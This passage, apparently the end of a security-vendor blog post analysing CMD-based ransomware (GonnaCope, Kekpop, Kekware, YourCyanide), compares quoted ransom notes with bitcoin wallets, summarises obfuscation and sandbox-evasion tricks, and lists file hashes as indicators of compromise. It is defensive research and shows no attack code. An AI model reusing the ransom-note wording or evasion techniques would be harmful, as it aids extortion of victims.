A: You will never get your files back.</p>
</td>
<td valign="top" width="131"><p>Q: What happened to my files?
A: They got encrypted by kekpop.</p>
<p>Q: how can i get them back?
A: You can get them back by paying $500 in bitcoin to this btc wallet bc1qrl532s9r2qge8d8p7qlrq57dc4uhssqjexmlwf</p>
<p>Q: What happens if i dont pay?
A: You will never get your files back.</p>
<p>Q: Is this related to kpop?
A: No fuck kpop</p>
</td>
<td valign="top" width="156"><p>Q: What happened to my files? 
A: Oops! your files have been encrypted by YourCyanide. 
. 
Q: how can I get them back? 
A: You can get them back by paying $500 in bitcoin to this btc wallet bc1qrl532s9r2qge8d8p7qlrq57dc4uhssqjexmlwf. 
. 
Q: What happens if I dont pay 
A: You will never get your files back. 
. 
Q: How can I contact you 
A: contact at <a href="mailto:yourcyanide.help@gmail.com">yourcyanide.help@gmail.com</a> 
++++++++++++++++++++++++++++++++++++++++++++ 
RAndOm Files have been encrypted </p>
</td>
</tr><tr><td valign="top" width="105"><p>Other messages</p>
</td>
<td valign="top" width="98"> </td>
<td valign="top" width="133"> </td>
<td valign="top" width="131"><p>kekpop is on your network</p>
</td>
<td valign="top" width="156"><p>Kekware and kekpop were just the beginning</p>
</td>
</tr><tr><td valign="top" width="105"><p>BTC wallet used</p>
</td>
<td valign="top" width="98"><p>bc1qlly4puaz7pz3zmph8n2d620jc2j60qf4ve5qll</p>
</td>
<td valign="top" width="133"><p>bc1qrl532s9r2qge8d8p7qlrq57dc4uhssqjexmlwf</p>
</td>
<td valign="top" width="131"><p>bc1qrl532s9r2qge8d8p7qlrq57dc4uhssqjexmlwf</p>
</td>
<td valign="top" width="156"><p>bc1qrl532s9r2qge8d8p7qlrq57dc4uhssqjexmlwf</p>
</td>
</tr></tbody></table>
<h1>Conclusion</h1>
<p>The continued use of heavily obfuscated script results in very low detections for these CMD-based ransomware, making it easier to compromise their victims’ machines. Even if the technique is not new, the use of multilayer custom environment variables for obfuscation is highly effective in avoiding detection. These ransomware variants are also capable of downloading multiple payloads, performing lateral movement via emails, and using Discord, Pastebin and even Microsoft document links.</p>
<figure class="image-figure">
<img alt="Figure 28. Low detections of CMD-based ransomware" src="https://marvel-b1-cdn.bc0a.com/f00000000017219/www.trendmicro.com/content/dam/trendmicro/global/en/research/22/f/yourcyanide-a-cmd-based-ransomware-with-multiple-layers-of-obfuscation/yourcyanide-28.png" style="max-width:80%;height:auto;width:auto;"/>
<figcaption>Figure 28. Low detections of CMD-based ransomware</figcaption>
</figure>
<p>From our analysis, we are able to infer that the malware author is actively monitoring the reports created by malware researchers by taking note of the usernames found in their sandbox logs and reports, and including them in the evasion list of usernames and machines that is part of the initialization process of the malware being used. </p>
<p>Ransomware variants that possess multiple capabilities — such as the one analyzed in this blog entry — are gaining popularity. While YourCyanide and its other variants are currently not as impactful as <a href="https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight">other families</a>, it represents an interesting update to ransomware kits by bundling a worm, a ransomware, and an information stealer into a single mid-tier ransomware framework.</p>
<p>It is also likely that these ransomware variants are in their development stages, making it a priority to detect and block them before they can evolve further and do even more damage.</p>
<h1>Trend Micro solutions</h1>
<p>A multilayered approach can help organizations defend against ransomware attacks using security technologies that can detect malicious components and suspicious behavior.</p>
<ul>
<li class="rich-text-li"><a href="https://www.trendmicro.com/en_us/business/products/detection-response.html">Trend Micro Vision One™</a> provides multilayered protection and behavior detection, which helps block suspicious behavior and tools before the ransomware can do any damage.</li>
<li class="rich-text-li"><a href="https://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-workload-security.html">Trend Micro Cloud One™ Workload Security</a> protects systems against both known and unknown threats that exploit vulnerabilities through virtual patching and machine learning.</li>
<li class="rich-text-li"><a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/email-inspector.html">Trend Micro™ Deep Discovery™ Email Inspector</a> employs custom sandboxing and advanced analysis techniques to effectively block malicious emails that can serve as entry points for ransomware.</li>
<li class="rich-text-li"><a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html">Trend Micro Apex One™</a> offers automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring endpoint protection.</li>
</ul>
<h1>Indicators of Compromise</h1>
<table border="3" cellpadding="0" cellspacing="0" width="100%">
<tbody><tr><td><p>GONNACOPE</p>
</td>
<td valign="top" width="480"> </td>
<td valign="top" width="271"> </td>
</tr><tr><td valign="top" width="179"><p>File</p>
</td>
<td valign="top" width="480"><p>SHA256</p>
</td>
<td valign="top" width="271"><p>Detection</p>
</td>
</tr><tr><td valign="top" width="179"><p>GonnaCope.Bat</p>
</td>
<td valign="top" width="480"><p>ab71472e5a66740369c70715245a948d452a59ea7281233d6ad4c53dfa36b968</p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.GONNACOPE.A</p>
</td>
</tr><tr><td valign="top" width="179"><p>GonnaCope.Bat</p>
</td>
<td valign="top" width="480"><p>0dff760288b3dfebc812761a2596563e5f0aea8ffc9ca4a4c26fa46e74311122</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.GONNACOPE.THEOEBB</p>
</td>
</tr><tr><td valign="top" width="179"><p>GonnaCopeDL</p>
</td>
<td valign="top" width="480"><p>f9fdfb0d4e2d2ea06ce9222280cd03d25c9768dfa502b871846153be30816fd3</p>
</td>
<td valign="top" width="271"><p>Trojan.MSIL.GONNACOPE.A</p>
</td>
</tr><tr><td valign="top" width="179"><p>GonnaCopeCryptor</p>
</td>
<td valign="top" width="480"><p>2987b5cacc9de6c3a477bd1fc21b960db3ea8742e3b46906d134aa8b73f17280</p>
</td>
<td valign="top" width="271"><p>Ransom.MSIL.GONNACOPE.YXCEE</p>
</td>
</tr><tr><td valign="top" width="179"><p>GonnaCope</p>
</td>
<td valign="top" width="480"><p>7388722c3a19854c1ccf19a92798a7cef0efae538e8e8ecf5e79620e6a49cea7</p>
</td>
<td valign="top" width="271"><p>TrojanSpy.MSIL.GONNACOPE.A</p>
</td>
</tr><tr><td valign="top" width="179"><p>GonnaCopeRansNote</p>
</td>
<td valign="top" width="480"><p>7edb2d152d8744343222b1b93ff846616fc3ca702e96c7e7a3663d2d938d8374</p>
</td>
<td valign="top" width="271"><p>Ransom.MSIL.GONNACOPE.A.note</p>
</td>
</tr><tr><td valign="top" width="179"><p>mail.vbs</p>
</td>
<td valign="top" width="480"><p>26bde18048c32f6612d8d76b8696b2ce59db227913dccd51f696b51640ee11e9</p>
</td>
<td valign="top" width="271"><p>Worm.VBS.GONNACOPE.A</p>
</td>
</tr><tr><td valign="top" width="179"><p>msg.vbs</p>
</td>
<td valign="top" width="480"><p>ca84abd94b65d69ee8d26ffc3cc63a5a0886136e63d405ac293fefecc1d2ff3a</p>
</td>
<td valign="top" width="271"><p>PUA.VBS.GonnaLoop.A</p>
</td>
</tr><tr><td valign="top" width="179"><p>msgbox.vbs</p>
</td>
<td valign="top" width="480"><p>d12e08e5dd94021dfa59d36d3adfe7f47df180023a04be781fa7695adc5ccc54</p>
</td>
<td valign="top" width="271"><p>PUA.VBS.GonnaLoop.A</p>
</td>
</tr><tr><td valign="top" width="179"><p>nokeyboard.reg</p>
</td>
<td valign="top" width="480"><p>a029ae77eced03e515a2acb0ee8ebecf3aebea402e441beef1615e3488234f8e</p>
</td>
<td valign="top" width="271"><p>PUA.Win32.Disabler.A</p>
</td>
</tr><tr><td valign="top" width="179"><p>Readme.txt</p>
</td>
<td valign="top" width="480"><p>9c39b7535b527df3b70800562bad98dc2e046de321fe3914dab896eda753cf38</p>
</td>
<td valign="top" width="271"><p>Ransom.Win32.GONNACOPE.YXCEW.note</p>
</td>
</tr><tr><td valign="top" width="179"><p>downloader.vbs</p>
</td>
<td valign="top" width="480"><p>45189864b6ff6d844d27b59123d2cd461f539d42b362e60e49da50119f0b7083</p>
</td>
<td valign="top" width="271"><p>Trojan.VBS.GONNACOPE.A</p>
</td>
</tr><tr><td valign="top" width="179"> </td>
<td valign="top" width="480"> </td>
<td valign="top" width="271"> </td>
</tr><tr><td valign="top" width="179"><p>KEKPOP</p>
</td>
<td valign="top" width="480"> </td>
<td valign="top" width="271"> </td>
</tr><tr><td valign="top" width="179"><p>File</p>
</td>
<td valign="top" width="480"><p>SHA256</p>
</td>
<td valign="top" width="271"><p>Detection</p>
</td>
</tr><tr><td rowspan="2" valign="top" width="179"><p>Arrival</p>
</td>
<td valign="top" width="480"><p>c8d6298f5ef09a324bb6afc7bb4550857fbd0fcbaea2b315b4f00d78bcc6a262</p>
</td>
<td rowspan="2" valign="top" width="271"><p> Trojan.BAT.KEKPOP.THEACBB</p>
</td>
</tr><tr><td valign="top" width="480"><p>296ba1469d072c37c6361fe80ba396a92f6461b9562103a3b5a20841d0757722</p>
</td>
</tr><tr><td rowspan="4" valign="top" width="179"><p>Main File </p>
</td>
<td valign="top" width="480"><p>bfd9336deeb399f412c51f8f6797e6b5dc81afa1f1638ab937a28df733a78c0f</p>
</td>
<td rowspan="4" valign="top" width="271"><p>Ransom.BAT.KEKPOP.THEAABB</p>
</td>
</tr><tr><td valign="top" width="480"><p>f8a0d9ea41c2b9082f9aebbc7e337b22d1092dd307ccd34d71fdbd56fd94a41d</p>
</td>
</tr><tr><td valign="top" width="480"><p>1e791e8511ac29bf4fd2a289ed35bb24151a7b0bfa3ab9854b2a586ede050a54</p>
</td>
</tr><tr><td valign="top" width="480"><p>d2d25dee61b17133415b4856412f20134823177effccd53a1f14677d372a4b56</p>
</td>
</tr><tr><td valign="top" width="179"><p>Dropped BAT File 1</p>
</td>
<td valign="top" width="480"><p> </p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.KEKPOP.THEACBB</p>
</td>
</tr><tr><td valign="top" width="179"><p>Dropped BAT File 2</p>
</td>
<td valign="top" width="480"><p>9b087a352fcb0a61545dbd68f7dfa32e0e15f98ca1547207d9ff918881ff5c75</p>
</td>
<td valign="top" width="271"><p>TrojanSpy.BAT.KEKPOP.THEACBB</p>
</td>
</tr><tr><td valign="top" width="179"><p>Dropped BAT File 3</p>
</td>
<td valign="top" width="480"><p>7fed00a9456b6945813f46294d2f587e7486b38917a8818a77774a2a8e2cfe9b</p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.KEKPOP.THEACBB</p>
</td>
</tr><tr><td valign="top" width="179"><p>Dropped Text File</p>
</td>
<td valign="top" width="480"><p> </p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.THEACBB.note</p>
</td>
</tr><tr><td valign="top" width="179"><p>Dropped HTML File</p>
</td>
<td valign="top" width="480"><p> </p>
</td>
<td valign="top" width="271"><p>Ransom.HTML.KEKPOP.THEACBB.note</p>
</td>
</tr><tr><td valign="top" width="179"><p>Passwords.exe</p>
</td>
<td valign="top" width="480"><p>53043bd27f47dbbe3e5ac691d8a586ab56a33f734356be9b8e49c7e975241a56</p>
</td>
<td valign="top" width="271"><p>HackTool.Win32.NirsoftPT.SM</p>
</td>
</tr><tr><td valign="top" width="179"><p>GetToken.exe</p>
</td>
<td valign="top" width="480"><p>6ad08fe301caae18941487412e96ceb0b561de4482da25ea4bb8eeb6c1a40983</p>
</td>
<td valign="top" width="271"><p>Trojan.MSIL.TOKENSTEALER.YXCES</p>
</td>
</tr><tr><td valign="top" width="179"><p>kekpopdicord.exe</p>
</td>
<td valign="top" width="480"><p>e5f589027e859e8bedb2d5fbecff37dcf7bcf7e4af6671c1c0c9aac9b6712913</p>
</td>
<td valign="top" width="271"><p>Trojan.Win64.KEKPOP.YXCET</p>
</td>
</tr><tr><td valign="top" width="179"><p> </p>
</td>
<td valign="top" width="480"><p> </p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.KEKPOP.YXCEZ</p>
</td>
</tr><tr><td valign="top" width="179"> </td>
<td valign="top" width="480"> </td>
<td valign="top" width="271"> </td>
</tr><tr><td valign="top" width="179"><p>KEKWARE</p>
</td>
<td valign="top" width="480"> </td>
<td valign="top" width="271"> </td>
</tr><tr><td valign="top" width="179"><p>File</p>
</td>
<td valign="top" width="480"><p>SHA256</p>
</td>
<td valign="top" width="271"><p>Detection</p>
</td>
</tr><tr><td rowspan="2" valign="top" width="179"><p>Arrival</p>
</td>
<td valign="top" width="480"><p>3262ece43e7135c9ed6788588bae269ed75db800964d48cfb762542e0d003259</p>
</td>
<td valign="top" width="271"><p>Trojan.PS1.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="480"><p>23269070507a70c34a4e219f9be19943211ed38eec4a9ce2b3a49bf76676a5e3</p>
</td>
<td valign="top" width="271"><p>Trojan.PS1.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>Main File </p>
</td>
<td valign="top" width="480"><p>e0946a55e9cbdb3485f154f72994bad765b74ba280a2149485af113503b7dc78</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>YcynNote.txt</p>
</td>
<td valign="top" width="480"><p>602533e3c67a248e4dc152fa266a372dd2b2d82ff68fdc17c1591ecc429147bc</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCEST.note</p>
</td>
</tr><tr><td valign="top" width="179"><p>rAndom.cmd</p>
</td>
<td valign="top" width="480"><p>7fed00a9456b6945813f46294d2f587e7486b38917a8818a77774a2a8e2cfe9b</p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.KEKPOP.THEACBB</p>
</td>
</tr><tr><td valign="top" width="179"><p>cynlog.cmd</p>
</td>
<td valign="top" width="480"><p>9b087a352fcb0a61545dbd68f7dfa32e0e15f98ca1547207d9ff918881ff5c75</p>
</td>
<td valign="top" width="271"><p>TrojanSpy.BAT.KEKPOP.THEACBB</p>
</td>
</tr><tr><td valign="top" width="179"><p>Passwords.exe</p>
</td>
<td valign="top" width="480"><p>53043bd27f47dbbe3e5ac691d8a586ab56a33f734356be9b8e49c7e975241a56</p>
</td>
<td valign="top" width="271"><p>HackTool.Win32.NirsoftPT.SM</p>
</td>
</tr><tr><td valign="top" width="179"><p>GetToken.exe</p>
</td>
<td valign="top" width="480"><p>6ad08fe301caae18941487412e96ceb0b561de4482da25ea4bb8eeb6c1a40983</p>
</td>
<td valign="top" width="271"><p>Trojan.MSIL.TOKENSTEALER.YXCES</p>
</td>
</tr><tr><td valign="top" width="179"><p>black.bat</p>
</td>
<td valign="top" width="480"><p>07fab8134ff635078cab876dba1e35c536936d193a3667637e0561c6efbb0a85</p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>loveletter.vbs</p>
</td>
<td valign="top" width="480"><p>f0afc40bec9453d38f2cd7d70e25bc76797839c2d28180904295639080013416</p>
</td>
<td valign="top" width="271"><p>Worm.VBS.MASSMAIL.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>mail.vbs</p>
</td>
<td valign="top" width="480"><p>080c4f412087aa3b652e8777ea00c801424ad6c4326bf020b9c264440e37c868</p>
</td>
<td valign="top" width="271"><p>Worm.VBS.MASSMAIL.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>fasdgfsdga.cmd</p>
</td>
<td valign="top" width="480"><p>56622656231060b6401dcea515953d517fd9212b8de66c33c4847840aa958c83</p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.POWLOAD.TIAOELC</p>
</td>
</tr><tr><td valign="top" width="179"> </td>
<td valign="top" width="480"> </td>
<td valign="top" width="271"> </td>
</tr><tr><td valign="top" width="179"><p>YOURCYANIDE</p>
</td>
<td valign="top" width="480"> </td>
<td valign="top" width="271"> </td>
</tr><tr><td valign="top" width="179"><p>File</p>
</td>
<td valign="top" width="480"><p>SHA256</p>
</td>
<td valign="top" width="271"><p>Detection</p>
</td>
</tr><tr><td rowspan="4" valign="top" width="179"><p>LNK</p>
</td>
<td valign="top" width="480"><p>31655244d3b77ae661f10199cd823f54c473d92a88ae892ee1b75bc5794482ad</p>
</td>
<td valign="top" width="271"><p>Trojan.LNK.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="480"><p>9e973f75c22c718c7438bc1d4614be11ae18e2d5140ecc44c166b5f5102d5fbe</p>
</td>
<td valign="top" width="271"><p>Trojan.LNK.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>c5d842735709618ee4f2521c95bf029a0690c3cbe5f7a06a916f633ebe09dd50</p>
</td>
<td valign="top" width="271"><p>Trojan.LNK.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>f9a2c524c270d581b83c010136402c00623bb36b2dd7758ea5e59c9369fa7649</p>
</td>
<td valign="top" width="271"><p>Trojan.LNK.KEKPOP.YXCERT</p>
</td>
</tr><tr><td rowspan="5" valign="top" width="179"><p>Win64 EXE Dropper</p>
</td>
<td valign="top" width="480"><p>8249d6e886a97aec60d35d360773e76c6630d822817dabe1c7674a0b51965669</p>
</td>
<td valign="top" width="271"><p>Trojan.Win64.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="480"><p>d51538d8da12af8ae36f95b645e76218e4fd61ab433504a3900c14942160446c</p>
</td>
<td valign="top" width="271"><p>Trojan.Win64.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>6a645f72acf1d6c906e8c844e4e8b3fc92c411bf69937cfe7069df2cc51b8a4e</p>
</td>
<td valign="top" width="271"><p>Trojan.Win64.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>2f2fac2c91268a9b31401633b63a374242e46919dc21106466c6c05bab3ce3f8</p>
</td>
<td valign="top" width="271"><p>Trojan.Win64.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>a180c31666788fb6a7da421a743bb1c487099297ec06f2bdd841f342021f3763</p>
</td>
<td valign="top" width="271"><p>Trojan.Win64.KEKPOP.YXCERT</p>
</td>
</tr><tr><td rowspan="2" valign="top" width="179"><p>Downloader of the payload</p>
</td>
<td valign="top" width="480"><p>b43d1af1abeef8b552f0b362b2162c3a940a843f5474518c665e145b3aa01ace</p>
</td>
<td valign="top" width="271"><p>Trojan.PS1.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="480"><p>6e33a2c56b7b32be8e99a15920cf179b4e7aa62eaef8496ace67261543569c25</p>
</td>
<td valign="top" width="271"><p>Trojan.LNK.KEKPOP.YXCERT</p>
</td>
</tr><tr><td rowspan="6" valign="top" width="179"><p>Main File (YourCyanide.cmd)</p>
</td>
<td valign="top" width="480"><p>6ab0e2e13c32b18b06b9b93b1fe607a7e04a5c0ba09816c36fba1573a47ded91</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>f8860ce270a2dec3ae1c51ff2c9aea5efe0015d519ebac4ca4c1ac0d97e73323</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>8f0dbf9a6841ced62d7f5c130f420bd5a2b39141097fefba9727034d1bf3b402</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>67a1e573955304887d30ff924eb01ba8a60a188835d7275265ecc716360fb0cf</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>a3523e2ba2c221593a0c16640bfeef8cd146f747fa62620cc2834e417578c34c</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="480"><p>0ed64dd6e08e5b9c9282966f439ab8881b4611052838db1ef79fabc38b8a61d2</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCERT</p>
</td>
</tr><tr><td valign="top" width="179"><p>black.bat</p>
</td>
<td valign="top" width="480"><p>07fab8134ff635078cab876dba1e35c536936d193a3667637e0561c6efbb0a85</p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>ycynlog.cmd</p>
</td>
<td valign="top" width="480"><p>298c325bbc80af8b3ac77365dd7cc3f97000a8377f36937d8563ab743a92b21c</p>
</td>
<td valign="top" width="271"><p>TrojanSpy.BAT.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>YcynNote.txt</p>
</td>
<td valign="top" width="480"><p>4e455d4b353c7cce0155ce1050afc30d064fd93c57bc6428eb3cd988ecd855f0</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCERT.note</p>
</td>
</tr><tr><td valign="top" width="179"><p>other.txt</p>
</td>
<td valign="top" width="480"><p>a4c3412ac96061561c6cf05a259dd14e5151fe66eee115ff154d6a0366ba1a12</p>
</td>
<td valign="top" width="271"><p>N/A - non-malicious component</p>
</td>
</tr><tr><td valign="top" width="179"><p>loveletter.vbs</p>
</td>
<td valign="top" width="480"><p>f0afc40bec9453d38f2cd7d70e25bc76797839c2d28180904295639080013416</p>
</td>
<td valign="top" width="271"><p>Worm.VBS.MASSMAIL.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>mail.vbs</p>
</td>
<td valign="top" width="480"><p>080c4f412087aa3b652e8777ea00c801424ad6c4326bf020b9c264440e37c868</p>
</td>
<td valign="top" width="271"><p>Worm.VBS.MASSMAIL.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>GetToken.exe</p>
</td>
<td valign="top" width="480"><p>6ad08fe301caae18941487412e96ceb0b561de4482da25ea4bb8eeb6c1a40983</p>
</td>
<td valign="top" width="271"><p>Trojan.MSIL.TOKENSTEALER.YXCES</p>
</td>
</tr><tr><td valign="top" width="179"><p>ForMe.exe</p>
</td>
<td valign="top" width="480"><p> </p>
</td>
<td valign="top" width="271"><p>N/A</p>
</td>
</tr><tr><td rowspan="2" valign="top" width="179"><p> </p>
</td>
<td valign="top" width="480"><p>316403043e4135474637c0e3f958e72015a08242dc2712f7635012e253cb81b2</p>
</td>
<td valign="top" width="271"><p>Trojan.LNK.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="480"><p>6a95f52d228316f9b48618a1c728e1c47ec71843e5b4cfb76ab3ef86dcd8cf8c</p>
</td>
<td valign="top" width="271"><p>Trojan.LNK.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p>Read_Me.txt.cmd</p>
</td>
<td valign="top" width="480"><p>77fd8fba88236d5f55bbb12dbaaa69ee7673397d8606c0c67b22ce523af818cd</p>
</td>
<td valign="top" width="271"><p>Trojan.BAT.POWLOAD.TIAOELB</p>
</td>
</tr><tr><td valign="top" width="179"><p>Main File (WinBugsFix.cmd)</p>
</td>
<td valign="top" width="480"><p>40b923db9c5da6b3bfe345139c42a71e2fd124de6a2808f8cec2a979a044f191</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCEST</p>
</td>
</tr><tr><td valign="top" width="179"><p> </p>
</td>
<td valign="top" width="480"><p>b0f7c2021c00a1d495f408295d161befa3faceab02d9c4047cee4904db6c1272</p>
</td>
<td valign="top" width="271"><p>Ransom.BAT.KEKPOP.YXCEST</p>
</td>
</tr></tbody></table>
Tags
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:medium/article">Articles, News, Reports</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:threats/ransomware">Ransomware</a>
|
<a class="tag--list-anchor" href="https://www.trendmicro.com/en_us/research.html?category=trend-micro-research:article-type/research">Research</a>
<h3 class="article-authors__title">
	
		Authors
	
</h3>
<ul class="article-authors__list">
<li class="article-authors__list-items">
<p>Ieriz Nicolle Gonzalez</p>
<p>Threat Analyst</p>
</li>
<li class="article-authors__list-items">
<p>Nathaniel Morales</p>
<p>Threat Analyst</p>
</li>
<li class="article-authors__list-items">
<p>Monte de Jesus</p>
<p>Threats Analyst</p>
</li>
</ul>
<a class="article-authors__button" href="mailto:tm_research@trendmicro.com" id="article-authors-contact-us-button" target="target">
		Contact Us
	</a>
<a class="article-authors__button subscribe bs-modal" href="#" target="target">
		Subscribe
	</a>
<h3 class="related--articles-title">Related Articles</h3>
<ul class="related--articles-items">
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/e/patch-your-wso2-cve-2022-29464-exploited-to-install-linux-compatible-cobalt-strike-beacons-other-malware.html">
					Patch Your WSO2: CVE-2022-29464 Exploited to Install Linux-Compatible Cobalt Strike Beacons, Other Malware 
				</a>
</li>
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/f/trend-micro-partners-with-interpol-and-nigeria-efcc-for-operatio.html">
					Trend Micro Partners With Interpol and Nigeria’s EFCC for Operation Killer Bee, Takes Down Nigerian BEC Actors
				</a>
</li>
<li class="related--articles-item">
<a class="related--articles-item-anchor" href="https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html">
					AvosLocker Ransomware Variant Abuses Driver File to Disable Antivirus, Scans for Log4shell
				</a>
</li>
</ul>
<a href="https://www.trendmicro.com/en_us/research.html">
				See all articles
			</a>
<a href="https://www.trendmicro.com/en_us/research.html">
</a>
</div>